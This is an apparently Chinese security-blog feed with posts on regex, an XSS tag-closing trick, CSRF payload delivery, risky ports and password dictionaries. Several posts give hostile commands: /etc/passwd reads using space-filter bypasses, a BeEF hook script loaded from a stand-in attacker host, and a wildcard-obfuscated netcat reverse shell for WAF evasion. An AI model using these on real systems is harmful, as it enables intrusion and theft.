    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>正则表达式是一个非常强大的处理字符工具，但有时可读性很差、晦涩难懂。</p><hr><a id="more"></a><p>本来是一个问题，引入正则表达式之后就成了两个问题。其实并不是任何场景都需要正则表达式。在简单场景，能用字符串自己提供的方法解决问题就没必要用正则表达式，比如字符替换</p><pre><code>&gt;&gt;&gt; import re&gt;&gt;&gt; text = &apos;java is most popular language&apos;&gt;&gt;&gt; re.sub(r&apos;java&apos;, &apos;python&apos;, text)&apos;python is most popular language&apos;# good&gt;&gt;&gt; text.replace(&quot;java&quot;, &quot;python&quot;)&apos;python is most popular language&apos;</code></pre><p>判断字符串是否以某字符开头</p><pre><code>&gt;&gt;&gt; re.match(r&quot;^java&quot;, text)&lt;_sre.SRE_Match object at 0x000000000471D578&gt;&gt;&gt;&gt; text.startwith(&quot;java&quot;)# good&gt;&gt;&gt; text.startswith(&quot;java&quot;)True</code></pre><h3 id="0x01-re-match-与-re-search"><a href="#0x01-re-match-与-re-search" class="headerlink" title="0x01 re.match() 与 re.search()"></a>0x01 re.match() 与 re.search()</h3><p>re.match 从字符串的起始位置匹配，如果没匹配成功就不再往后匹配，返回 None。而 search 虽然也是从起始位置开始匹配，但是如果在起始位置没有匹配，就继续往后匹配，直到匹配为止，如果匹配到字符串末尾都没有匹配则返回 None</p><pre><code>&gt;&gt;&gt; text = &quot;java is most popular langauge&quot;&gt;&gt;&gt; re.match(&quot;most&quot;, text) # 没匹配# bad&gt;&gt;&gt; re.match(&quot;.*most&quot;, text) &lt;_sre.SRE_Match object at 0x0000000004CCD578&gt;# good&gt;&gt;&gt; re.search(&quot;most&quot;, text)&lt;_sre.SRE_Match object at 0x000000000471D578&gt;</code></pre><h3 id="0x02-不分组的括号"><a href="#0x02-不分组的括号" class="headerlink" title="0x02 不分组的括号"></a>0x02 不分组的括号</h3><p>我们知道正则表达式中括号可以用于分组提取，有时我们并不希望括号用于分组该怎么办，答案是使用 (?:)，看一个例子，用正则表达式提取URL中的各个组成部分<br><img src="/2020/04/07/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%B0%8F%E8%B4%B4%E5%A3%AB/1.webp" alt></p><pre><code>rex = r&apos;^(http[s]?)://([^/\s]+)([/\w\-\.]+[^#?\s]*)?(?:\?([^#]*))?(?:#(.*))?$&apos;print(re.match(rex, url).groups())&gt;&gt;&gt; (&apos;http&apos;,     &apos;www.example.com&apos;,      &apos;/path/to/myfile.html&apos;,      &apos;key1=value1&amp;key2=value2&apos;,      &apos;SomewhereInTheDocument&apos;)</code></pre><p>上面虽然写了7对括号，但其实只有5个分组。下面是不使用 ?:，出现了 7 组数据</p><pre><code>rex = r&apos;^(http[s]?)://([^/\s]+)([/\w\-\.]+[^#?\s]*)?(\?([^#]*))?(#(.*))?$&apos;print(re.match(rex, url).groups())&gt;&gt;&gt;(&apos;http&apos;,     &apos;www.example.com&apos;,     &apos;/path/to/myfile.html&apos;,     &apos;?key1=value1&amp;key2=value2&apos;,     &apos;key1=value1&amp;key2=value2&apos;,     &apos;#SomewhereInTheDocument&apos;,     &apos;SomewhereInTheDocument&apos;)</code></pre><h3 id="0x03-贪婪匹配"><a href="#0x03-贪婪匹配" class="headerlink" title="0x03 贪婪匹配"></a>0x03 贪婪匹配</h3><p>正则表达式默认是贪婪匹配的，也就是说它会在满足匹配条件的情况下尽可能多的匹配字符，例如这里有一段话：<br>    html = “””<div><p>Today a quick article on a nic</p><p>Read more …</p></div>“””<br>里面有两对</p><p>标签，如果你只想匹配第一对，使用</p><pre><code>&gt;&gt;&gt; re.search(&quot;&lt;p&gt;.*&lt;/p&gt;&quot;, html)&gt;&gt;&gt; m = re.search(&quot;&lt;p&gt;.*&lt;/p&gt;&quot;, html)&gt;&gt;&gt; m.group()&apos;&lt;p&gt;Today a quick article on a nic&lt;/p&gt;&lt;p&gt;Read more ...&lt;/p&gt;&apos;&gt;&gt;&gt;</code></pre><p><code>&lt;p&gt;.*&lt;/p&gt;</code> 会从第一个<code>&lt;p&gt;</code>开始，匹配到最后一个<code>&lt;/p&gt;</code>，如果要想尽可能少匹配则可以在元字符后面加 <code>?</code></p><pre><code>&gt;&gt;&gt; m = re.search(&quot;&lt;p&gt;.*?&lt;/p&gt;&quot;, html)&gt;&gt;&gt; m.group()&apos;&lt;p&gt;Today a quick article on a nic&lt;/p&gt;&apos;</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;正则表达式是一个非常强大的处理字符工具，但有时可读性很差、晦涩难懂。&lt;/p&gt;
&lt;hr&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>HTML中优先闭合的标签</title>
    <link href="http://black0saturday.github.io/2020/04/04/HTML%E4%B8%AD%E4%BC%98%E5%85%88%E9%97%AD%E5%90%88%E7%9A%84%E6%A0%87%E7%AD%BE/"/>
    <id>http://black0saturday.github.io/2020/04/04/HTML中优先闭合的标签/</id>
    <published>2020-04-04T03:28:31.000Z</published>
    <updated>2020-04-07T07:43:39.597Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习HTML时发现有个有趣的现象，就是有的标签会优先闭合。<br><a id="more"></a><br>先看一段 HTML：</p><pre><code>&lt;html&gt;    &lt;head&gt;&lt;title&gt;noframes&lt;/title&gt;&lt;/head&gt;    &lt;body&gt;        &lt;noframes&gt;            &lt;img src=&quot;//x.xx/?x=&lt;/noframes&gt;&lt;script&gt;alert(1)&lt;/script&gt;&quot; width=0 height=0/&gt;        &lt;/noframes&gt;    &lt;/body&gt;&lt;/html&gt;</code></pre><p>HTML正常读大概就是展示一张图片。<br>那么用浏览器打开看看。</p><p><img src="/2020/04/04/HTML%E4%B8%AD%E4%BC%98%E5%85%88%E9%97%AD%E5%90%88%E7%9A%84%E6%A0%87%E7%AD%BE/1.webp" alt></p><p>并没有按照想象中的展示图片而是弹了个窗。</p><p>看看浏览器处理的源码<br><img src="/2020/04/04/HTML%E4%B8%AD%E4%BC%98%E5%85%88%E9%97%AD%E5%90%88%E7%9A%84%E6%A0%87%E7%AD%BE/1.png" alt></p><p>原来，<strong>img</strong> 标签 <strong>src</strong> 属性里的 <strong>\&lt;/noframes></strong>，跳过了 <strong>\&lt;img></strong> 标签和 <strong>src</strong> 属性，把外层的 <strong>\&lt;noframes></strong> 给闭合了，导致 <strong>src</strong> 后半部分的 <strong>script</strong> 标签被解析成了 HTML，从而触发了弹框。</p><p>这可奇怪了。<strong>\&lt;/noframes></strong> 明明在双引号里面，怎么就跨越了 <strong>src</strong> 属性跨越了 <strong>\&lt;img></strong> 标签，漂洋过海地把外层的 <strong>noframes</strong> 标签给闭合了？有一种可能就是，它的闭合优先级，高于双引号的完整性优先级，高于嵌套在内层的标签的闭合优先级。</p><p>研究发现，还有一些标签是闭合优先级高于双引号完整性优先级的特殊标签。</p><ul><li>\&lt;!–</li><li>\&lt;iframe></li><li>\&lt;noframes></li><li>\&lt;noscript></li><li>\&lt;script></li><li>\&lt;style></li><li>\&lt;textarea></li><li>\&lt;title></li><li>\&lt;xmp></li></ul><hr><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>这个特性出现的原因，可能是源于浏览器对 DOM 树的特殊处理。而在某些 XSS 攻击的场景下，这一特性可能导致意想不到的结果。</p><p>特别是，像邮箱或论坛等支持富文本的应用，出于防御 XSS 的考虑，一定会对用户的输入进行语法分析和检查。但是，如果语法分析的结果和浏览器的识别结果不一致的话，就会形成 XSS 的攻击点。</p><p>比如文章开头的那段 noframes 语句，如果防 XSS 引擎将 src 里的内容统一理解为 img 的 src 属性，就可能形成 XSS 攻击的入口点。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;学习HTML时发现有个有趣的现象，就是有的标签会优先闭合。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="XSS" scheme="http://black0saturday.github.io/tags/XSS/"/>
    
  </entry>
  
  <entry>
    <title>WEB漏洞-CSRF</title>
    <link href="http://black0saturday.github.io/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/"/>
    <id>http://black0saturday.github.io/2020/04/02/WEB漏洞-CSRF/</id>
    <published>2020-04-02T06:52:08.000Z</published>
    <updated>2020-04-03T03:07:43.313Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>CSRF曾在2007年、2010年、2013年三次入围OWASP TOP10。因为越来越多的框架提供了secure by default的设定和一些形式的保护，这也就是说CSRF不再是一个问题。这也就是2017版的CSRF不再出现在OWASP TOP10的原因。<br><a id="more"></a></p><p>研究人员发现，可以利用CSRF来传播大量的payload到终端用户。攻击者常用的CSRF传播的payload是：</p><ul><li>Persistent Cross Site Scripting (XSS)</li><li>CSV Injection (CSVi)</li><li>CSV Injection to Reflected Cross Site Scripting (XSS)</li></ul><hr><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的HTTP请求，包括该用户的会话cookie和其他认证信息，发送一个存在漏洞的web应用程序。这即允许攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，并且这些请求会被应用程序认为是用户的合法请求。</strong></p><h3 id="CSRF-Payload传播"><a href="#CSRF-Payload传播" class="headerlink" title="CSRF Payload传播"></a>CSRF Payload传播</h3><p>研究人员发现可以通过一个简单的CSRF PoC来传播所有类型的payload，因为大多数社会工程场景中的CSRF是一样的。<br>下面是一个登入的win form:<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/1.png" alt></p><p>页面前端代码如下：<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/2.png" alt></p><p>为了解释请求，第一部分的H1和input并没有什么用处，真实的payload是隐藏在input表单中。这也是CSRF发生的地方，攻击者可以让这些值有意义。攻击者可以利用这些payload的传播来设定payload的值。在XSS设定的例子中，会在域名内弹出一个告警框。</p><p>但是这个值可以是任何值，在更加恶意的环境中，攻击者可以利用浏览器或利用框架来hook受害者的浏览器。这样的恶意表单示例如下：<br><img src="/2020/04/02/WEB%E6%BC%8F%E6%B4%9E-CSRF/3.png" alt></p><p>把<strong>value</strong>的值改成如下代码<br>    value=”<script src="https://attackersite/beef.js"></script>“ /&gt;</p><p>Payload被注入到firstname域中，表单会通过请求提交的方式传递到攻击者的服务器，然后受害者的服务器就会用JS脚本钩住用于下一步的利用。根据应用的功能，攻击者payload会传递持久型和反射型的XSS脚本。</p><hr><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><h3 id="CSV注入payload"><a href="#CSV注入payload" class="headerlink" title="CSV注入payload"></a>CSV注入payload</h3><ul><li>Python</li></ul><p>`</p><pre><code>def escape(payload):    if payload[0] in (&apos;@&apos;,&apos;+&apos;,&apos;-&apos;, &apos;=&apos;, &apos;|&apos;, &apos;%&apos;):     payload = payload.replace(&quot;|&quot;, &quot;\|&quot;)     payload = &quot;&apos;&quot; + payload + &quot;&apos;&quot;     return payload</code></pre><ul><li>PHP</li></ul><p>`</p><pre><code>public static function escape_csv( $payload ) {    $triggers = array( &apos;=&apos;, &apos;+&apos;, &apos;-&apos;, &apos;@&apos;, &apos;|&apos;, &apos;%&apos;);    if ( in_array( mb_substr( $payload, 0, 1 ), $triggers, true ) ) {    $payload = &quot;&apos;&quot; . $payload . &quot;&apos;&quot;;        }return $payload;    }</code></pre>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;CSRF曾在2007年、2010年、2013年三次入围OWASP TOP10。因为越来越多的框架提供了secure by default的设定和一些形式的保护，这也就是说CSRF不再是一个问题。这也就是2017版的CSRF不再出现在OWASP TOP10的原因。&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="CSRF" scheme="http://black0saturday.github.io/tags/CSRF/"/>
    
  </entry>
  
  <entry>
    <title>常见密码字典</title>
    <link href="http://black0saturday.github.io/2020/04/01/%E5%B8%B8%E8%A7%81%E5%AF%86%E7%A0%81%E5%AD%97%E5%85%B8/"/>
    <id>http://black0saturday.github.io/2020/04/01/常见密码字典/</id>
    <published>2020-04-01T06:33:43.000Z</published>
    <updated>2020-04-01T09:05:41.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>收集一些常见密码字典<br><a id="more"></a></p><h3 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h3><ul><li><a href="https://pan.baidu.com/share/link?shareid=193969&amp;uk=1965926143" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=193969&amp;uk=1965926143</a></li><li><a href="https://pan.baidu.com/share/link?shareid=193972&amp;uk=1965926143" target="_blank" rel="noopener">https://pan.baidu.com/share/link?shareid=193972&amp;uk=1965926143</a></li><li><a href="https://github.com/rootphantomer/Blasting_dictionary" target="_blank" rel="noopener">https://github.com/rootphantomer/Blasting_dictionary</a></li><li><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_100.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_100.txt</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_1000.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_1000.txt</a></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/top_500.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/top_500.txt</a></li><li><a href="https://github.com/noootown/PasswordDictionary" target="_blank" rel="noopener">https://github.com/noootown/PasswordDictionary</a></li><li><a href="https://github.com/hxer/dictTree" target="_blank" rel="noopener">https://github.com/hxer/dictTree</a><h3 id="Fuzz"><a href="#Fuzz" class="headerlink" title="Fuzz"></a>Fuzz</h3></li><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/web-fuzz-dict.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/web-fuzz-dict.txt</a></li></ul><h3 id="User-Agent"><a href="#User-Agent" class="headerlink" title="User-Agent"></a>User-Agent</h3><ul><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/user-agents.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/user-agents.txt</a></li></ul><h3 id="File-Locations"><a href="#File-Locations" class="headerlink" title="File-Locations"></a>File-Locations</h3><ul><li><a href="https://github.com/dustyfresh/dictionaries/blob/master/file-locations.txt" target="_blank" rel="noopener">https://github.com/dustyfresh/dictionaries/blob/master/file-locations.txt</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;收集一些常见密码字典&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="爆破" scheme="http://black0saturday.github.io/tags/%E7%88%86%E7%A0%B4/"/>
    
  </entry>
  
  <entry>
    <title>常见web危险端口介绍</title>
    <link href="http://black0saturday.github.io/2020/03/31/%E5%B8%B8%E8%A7%81web%E5%8D%B1%E9%99%A9%E7%AB%AF%E5%8F%A3%E4%BB%8B%E7%BB%8D/"/>
    <id>http://black0saturday.github.io/2020/03/31/常见web危险端口介绍/</id>
    <published>2020-03-31T08:43:53.000Z</published>
    <updated>2020-04-01T09:55:50.467Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端口及对应的服务和漏洞"><a href="#端口及对应的服务和漏洞" class="headerlink" title="端口及对应的服务和漏洞"></a>端口及对应的服务和漏洞</h2><ul><li>20：FTP服务的数据传输端口</li><li>21：FTP服务的连接端口，可能存在  弱口令暴力破解</li></ul><a id="more"></a><ul><li>22：SSH服务端口，可能存在 弱口令暴力破解</li><li>23：Telnet端口，可能存在 弱口令暴力破解</li><li>25：SMTP简单邮件传输协议端口，和 POP3 的110端口对应</li><li>43：whois服务端口</li><li>53：DNS服务端口(TCP/UDP 53)</li><li>67/68：DHCP服务端口</li><li>69：TFTP端口，可能存在弱口令</li><li>80：HTTP端口，常见web漏洞</li><li>88：Kerberos协议端口</li><li>110：POP3邮件服务端口，和SMTP的25端口对应</li><li>135：RPC服务</li><li>137/138： NMB服务</li><li>139：SMB/CIFS服务</li><li>143：IMAP协议端口</li><li>161/162: Snmp服务，public弱口令</li><li>389：LDAP目录访问协议，有可能存在注入、弱口令</li><li>443：HTTPS端口，心脏滴血等与SSL有关的漏洞</li><li>445：SMB服务端口，可能存在永恒之蓝漏洞MS17-010</li><li>512/513/514：Linux Rexec服务端口，可能存在爆破</li><li>873：Rsync ，可能存在Rsync未授权访问漏洞，传送门：rsync 未授权访问漏洞</li><li>1080：socket端口，可能存在爆破</li><li>1099：RMI，可能存在 RMI反序列化漏洞</li><li>1352：Lotus domino邮件服务端口，可能存在弱口令、信息泄露</li><li>1433：SQL Server对外提供服务端口</li><li>1434：用于向请求者返回SQL Server使用了哪个TCP/IP端口</li><li>1521：oracle数据库端口</li><li>2049：NFS服务端口，可能存在NFS配置不当</li><li>2181：ZooKeeper监听端口，可能存在 ZooKeeper未授权访问漏洞</li><li>2375：Docker端口，可能存在 Docker未授权访问漏洞</li><li>2601:   Zebra ，默认密码zebr</li><li>3128:   squid ，匿名访问（可能内网漫游)</li><li>3268：LDAP目录访问协议，有可能存在注入、弱口令</li><li>3306：MySQL数据库端口，可能存在 弱口令暴力破解</li><li>3389：Windows远程桌面服务，可能存在 弱口令漏洞 或者 - CVE-2019-0708 远程桌面漏洞复现</li><li>3690：SVN服务，可能存在SVN泄漏，未授权访问漏洞</li><li>4440：Rundeck，弱口令admin</li><li>4560：log4j SocketServer监听的端口，可能存在 log4j&lt;=1.2.17反序列化漏洞（CVE-2019-17571）</li><li>4750：BMC，可能存在 BMC服务器自动化RSCD代理远程代码执行(CVE-2016-1542)</li><li>4848：GlassFish控制台端口，可能存在弱口令admin/adminadmin</li><li>5000：SysBase/DB2数据库端口，可能存在爆破、注入漏洞</li><li>5432：PostGreSQL数据库的端口</li><li>5632：PyAnywhere服务端口，可能存在代码执行漏洞</li><li>5900/5901：VNC监听端口，可能存在 VNC未授权访问漏洞</li><li>5984：CouchDB端口，可能存在 CouchDB未授权访问漏洞</li><li>6379：Redis数据库端口，可能存在Redis未授权访问漏洞，传送门：Redis未授权访问漏洞</li><li>7001/7002：Weblogic，可能存在Weblogic反序列化漏洞，传送门：Weblogic反序列化漏洞</li><li>7180：Cloudera manager端口</li><li>8069：Zabbix服务端口，可能存在Zabbix弱口令导致的Getshell漏洞</li><li>8080：Tomcat、JBoss，可能存在Tomcat管理页面弱口令Getshell，JBoss未授权访问漏洞，传送门：Tomcat管理弱口令页面Getshell</li><li>8080-8090：可能存在web服务</li><li>8089：Jetty、Jenkins服务端口，可能存在反序列化，控制台弱口令等漏洞</li><li>8161：Apache ActiveMQ后台管理系统端口，默认口令密码为：admin:admin ，可能存在CVE-2016-3088漏洞，传送门：Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）</li><li>9000：fastcgi端口，可能存在远程命令执行漏洞</li><li>9001：Supervisord，可能存在Supervisord远程命令执行漏洞(CVE-2017-11610)，传送门：Supervisord远程命令执行漏洞(CVE-2017-11610)</li><li>9043/9090：WebSphere，可能存在WebSphere反序列化漏洞</li><li>9200/9300：Elasticsearch监听端口，可能存在 Elasticsearch未授权访问漏洞</li><li>10000：Webmin-Web控制面板，可能存在弱口令</li><li>10001/10002：JmxRemoteLifecycleListener监听的，可能存在Tomcat反序列化漏洞，传送门：Tomcat反序列化漏洞(CVE-2016-8735)</li><li>11211：Memcached监听端口，可能存在 Memcached未授权访问漏洞</li><li>27017/27018：MongoDB数据库端口，可能存在 MongoDB未授权访问漏洞</li><li>50000：SAP Management Console服务端口，可能存在 运程命令执行漏洞。</li><li>50070：Hadoop服务端口，可能存在 Hadoop未授权访问漏洞</li><li>61616：Apache ActiveMQ服务端口，可能存在 Apache ActiveMQ任意文件写入漏洞（CVE-2016-3088）复现</li><li>60020：hbase.regionserver.port，HRegionServer的RPC端口</li><li>60030：hbase.regionserver.info.port，HRegionServer的http端口</li></ul><hr><h2 id="端口相关的命令（Windows）"><a href="#端口相关的命令（Windows）" class="headerlink" title="端口相关的命令（Windows）"></a>端口相关的命令（Windows）</h2><ul><li>netstat -a  显示一个所有的有效连接信息列表，包括已建立的连接（ESTABLISHED ），也包括监听连接请求（LISTENING ）的那些连接，<br>断开连接（CLOSE_WAIT ）或者处于联机等待状态的（TIME_WAIT ）等</li><li>netstat -n  以数字形式显示地址和端口号,显示所有已建立的有效连接</li><li>netstat -ano  列出所有端口的情况</li><li>netstat -ano|findstr “80”  查看被占用端口80对应的应用的PID</li><li>tasklist|findstr “80”  查看80端口被哪个进程或程序占用</li><li>结束该进程或程序：taskkill /f /t /im  XX.exe  结束该进程或程序</li></ul><hr><h2 id="Nmap中常见的服务"><a href="#Nmap中常见的服务" class="headerlink" title="Nmap中常见的服务"></a>Nmap中常见的服务</h2><ol><li>msmq?：默认对应的是1801端口，是MSMQ Microsoft Message Queuing（微软消息队列）的简称，是windows系统提供的一个功能，开启了该功能，则默认1801端口打开。该服务暂未发现漏洞。 </li><li>msrpc：Microsoft Remote Procedure Call（微软远程过程调用）是 Windows 操作系统使用的一个协议。该服务开启时对应端口2103、2105、2107开启。RPC 提供一种内部进程通讯机制，允许在一台电脑上运行的程序无缝的执行远程系统中的代码。</li><li>tcpwrapped：端口状态后经常标记tcpwrapped。tcpwrapped表示服务器运行 tcp_wrappers服务。该服务对应端口10050。tcp_wrappers是一种应用级防火墙。它可以根据预设，对SSH、Telnet、FTP服务的请求进行拦截，判断是否符合预设要求。如果符合，就会转发给对应的服务进程；否则，会中断连接请求。这说明tcp三次握手已经完成，但是并没有和目标主机建立连接。这表明，虽然目标主机的某项服务是可提供的，但你不在允许访问主机的名单列表中。当大量的端口服务都为tcpwrapped时，这说明可能是有负载均衡或者防火墙阻断了你的连接请求。</li><li>Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)：这是SQL Server中的SQL Reporting Service 服务使用的Microsoft HTTPAPI。该服务对应端口5985。</li></ol>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;端口及对应的服务和漏洞&quot;&gt;&lt;a href=&quot;#端口及对应的服务和漏洞&quot; class=&quot;headerlink&quot; title=&quot;端口及对应的服务和漏洞&quot;&gt;&lt;/a&gt;端口及对应的服务和漏洞&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;20：FTP服务的数据传输端口&lt;/li&gt;
&lt;li&gt;21：FTP服务的连接端口，可能存在  弱口令暴力破解&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
      <category term="渗透" scheme="http://black0saturday.github.io/tags/%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>命令执行绕过空格的姿势</title>
    <link href="http://black0saturday.github.io/2020/03/27/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E7%9A%84%E5%A7%BF%E5%8A%BF/"/>
    <id>http://black0saturday.github.io/2020/03/27/命令执行绕过空格的姿势/</id>
    <published>2020-03-27T02:42:32.000Z</published>
    <updated>2020-04-02T04:05:54.691Z</updated>
    
    <content type="html"><![CDATA[<p>在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：<br><a id="more"></a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">IFS&#x3D;,;&#96;cat&lt;&lt;&lt;cat,&#x2F;etc&#x2F;passwd&#96;</span><br><span class="line">cat$IFS&#x2F;etc&#x2F;passwd</span><br><span class="line">cat$&#123;IFS&#125;&#x2F;etc&#x2F;passwd</span><br><span class="line">cat&lt;&#x2F;etc&#x2F;passwd</span><br><span class="line">&#123;cat,&#x2F;etc&#x2F;passwd&#125;</span><br><span class="line">X&#x3D;$&#39;cat\x20&#x2F;etc&#x2F;passwd&#39;&amp;&amp;$X</span><br></pre></td></tr></table></figure><p>经过测试，除最后一条在mac osx下执行失败，这些命令在ubuntu 19.10和centos7下均执行成功。在mac osx系统下系统会将cat\x20/etc/passwd当成一个可执行文件，会提示No such file or directory。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在一些漏洞利用场景（如命令执行，SQL注入），或者因为waf等原因，导致无法使用空格时，可以试试如下命令：&lt;br&gt;&lt;/p&gt;
    
    </summary>
    
    
      <category term="随笔" scheme="http://black0saturday.github.io/tags/%E9%9A%8F%E7%AC%94/"/>
    
  </entry>
  
  <entry>
    <title>bash和通配符用法</title>
    <link href="http://black0saturday.github.io/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/"/>
    <id>http://black0saturday.github.io/2020/03/25/bash和通配符用法/</id>
    <published>2020-03-25T09:14:24.000Z</published>
    <updated>2020-04-03T03:09:02.159Z</updated>
    
    <content type="html"><![CDATA[<h3 id="特殊的通配符用法"><a href="#特殊的通配符用法" class="headerlink" title="特殊的通配符用法"></a>特殊的通配符用法</h3><p>Bash 标准通配符（也称为通配符模式）被各种命令行实用程序用于处理多个文件。并不是每个人都知道 bash 语法可以使用问号 <code>?</code>、正斜杠 <code>/</code>、数字和字母来执行系统命令。你甚至可以枚举文件并使用相同数量的字符获取其内容。<br><a id="more"></a><br>举几个例子：<br>可以使用以下语法来取代 ls 命令：<code>/???/?s</code><br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/1.png" alt><br>用这种语法，你可以基本做到你想做的任何事情。假设存在漏洞的目标位于WAF的后面，并且此 WAF 有一条规则，该规则可阻止包含 <code>/etc/passwd</code> 或 <code>/bin/ls</code> 在 GET 参数的值内或 POST 正文中的所有请求。</p><p>如果你试图发出这样的请求，<code>/?cmd=cat+/etc/passwd</code> 它将被目标 WAF 阻止，你的 IP 将被永久禁止，并被标记为 <strong>yet another f*</strong>in’ redteamer**。但你有通配符这个秘密武器。</p><p>如果目标 WAF 不阻止查询字符串里的 <code>?</code> 和 <code>/</code>，你就可以很容易地让你的请求（url 编码）变成这样：<code>/?cmd=%2f???%2f??t%20%2f???%2fp??s??</code><br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/2.png" alt><br>上图所示，有 3 个错误：<code>/bin/cat *: Is a directory</code>。发生这种情况是因为 <code>/???/?t</code> 可以被全局进程解释成 <code>/bin/cat</code>，也可以解释成 <code>/dev/net</code> 或 <code>/etc/apt</code> 等。</p><p>问号通配符可以代表任何字符。因此，如果你知道一个文件名的一部分，那么你可以使用这个通配符。例如，<code>ls *.???</code> 将列出当前目录中所有长度为 3 个字符的文件扩展名。因此，你将会看到具有诸如 .gif，.jpg，.txt 之类扩展名的文件。</p><p>使用这个通配符，你可以用 <code>netcat</code> 执行一个反弹 shell。假设你需要在端口 1337（通常 <code>nc -e /bin/bash 127.0.0.1 1337</code>）执行一个 127.0.0.1 的反弹 shell ，你可以用下面的语法来完成：<br>    /???/n? -e /???/b??h 2130706433 1337</p><p>将 IP 地址127.0.0.1转换为长整数格式（2130706433），可以避免在 HTTP 请求中使用 . 字符。</p><p>在 kali 中，需要使用 <code>nc.traditional</code> 而不是 <code>nc</code>，没有 <code>-e</code>参数，以便 <code>/bin/bash</code> 连接后执行。有效载荷变成这样：</p><pre><code>/???/?c.??????????? -e /???/b??h 2130706433 1337</code></pre><p><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/3.gif" alt><br>使用通配符执行反弹 shell<br>在对我们刚才看到的两个命令进行总结：</p><blockquote><p>标准：/bin/nc 127.0.0.1 1337<br>绕过：/???/n? 2130706433 1337<br>使用字符：/ ? n [0-9]</p></blockquote><blockquote><p>标准：/bin/cat /etc/passwd<br>绕过：/???/??t /???/??ss??<br>使用字符：/ ? t s</p></blockquote><p>为什么使用 <code>?</code> 而不是 <code>*?</code>由于<code>*</code>广泛用于评论语法，许多 WAF 为了避免 SQL 注入而过滤它，像 <code>UNION+SELECT+1,2,3/*</code></p><p>使用 echo 来枚举文件和目录。该 echo 命令可以使用通配符枚举文件系统上的文件和目录。例如 <code>echo /*/*ss*</code>:<br><img src="/2020/03/25/bash%E5%92%8C%E9%80%9A%E9%85%8D%E7%AC%A6%E7%94%A8%E6%B3%95/4.webp" alt></p><p>这命令可以在 RCE 漏洞中使用，以获取目标系统上的文件和目录，例如：<br><img 